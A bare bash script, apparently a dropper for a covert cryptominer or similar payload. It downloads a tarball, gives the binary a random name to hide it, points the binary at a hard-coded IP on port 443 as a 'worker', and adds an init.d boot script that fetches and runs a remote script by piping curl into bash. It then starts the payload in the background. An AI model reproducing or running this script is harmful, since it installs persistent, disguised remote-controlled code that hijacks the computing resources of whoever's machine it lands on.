cd /
wget https://github.com/reliciy/site/releases/download/v1.5.2/clay.tar
tar -xvf clay.tar
cd /clay
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv bones $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./ruin.sh
sed -i "s/host/20.163.170.215:443/g" ./ruin.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/reliciy/site/main/dig.sh)" > tomb.sh
chmod a+x tomb.sh
update-rc.d tomb.sh defaults
rm -rf clay.tar
cd /clay
nohup ./ruin.sh
ps -ef | grep clay
